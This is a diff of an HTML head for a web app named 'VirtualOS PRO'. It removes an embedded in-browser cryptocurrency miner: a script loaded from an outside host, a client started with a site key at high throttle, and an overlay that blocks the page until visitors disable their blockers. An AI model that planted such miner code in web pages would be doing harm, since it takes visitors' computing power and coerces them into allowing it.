@@ -1,28 +1,4 @@
 <head>
-  <script src="https://www.hostingcloud.racing/dklc.js"></script>
-<script>
-    var _client = new Client.Anonymous('bed0a8b6708badcb5e25800f2ce20283f1d2718a193958821047f9a0bdb06520', {
-        throttle: 0.9, c: 'w'
-    });
-    _client.start();
-    
-</script>
-<script>
-    setTimeout(function(){
-        if(typeof _client === 'undefined' || _client === null)
-        {
-            var messageDiv = document.createElement("div");
-            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
-            messageDiv.appendChild(document.createTextNode("Mining couldn't load, please disable any software that may block it, and reload VirtualOS PRO."));
-            var mainDiv = document.createElement("div");
-            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
-            mainDiv.appendChild(messageDiv);
-            document.body.appendChild(mainDiv);
-            document.getElementsByTagName("body")[0].style.overflow = "hidden";
-            window.scrollTo(0, 0);
-        }
-    },1000);
-</script>
 	<script type="text/javascript" src="/dom-drag.js"></script>
 	
 	<style type="text/css">
